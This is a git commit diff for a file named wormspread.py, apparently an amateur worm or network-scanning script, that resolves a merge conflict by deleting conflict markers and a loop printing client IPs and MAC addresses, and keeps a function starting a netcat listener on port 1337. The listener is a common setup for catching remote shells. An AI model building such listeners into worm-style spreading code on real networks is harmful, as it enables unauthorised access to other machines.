a67fcc1f2045e5fef461c4d464ae40805fd3c674
Greg Randall <77461008+gregorymrandall@users.noreply.github.com>
2021-07-03 15:21:03 -0400

    Update wormspread.py

--- wormspread.py
+++ wormspread.py
@@ -28,19 +28,9 @@ def worm_spread():
     return clients
 print(worm_spread())
 
-<<<<<<< HEAD
-
 def nc_listener():
     nc_setup=subprocess.run(["nc", "-lp", "1337"])
     return nc_setup
 print(nc_listener())
-
-
-=======
-for client in clients:
-    print("{:16}    {}".format(client['ip'], client['mac']))
-for client in clients:
-    target - client['ip']
     
-    print(target)
->>>>>>> 2944a59d5e0416156f0e545b75af8690c30a24a8
+
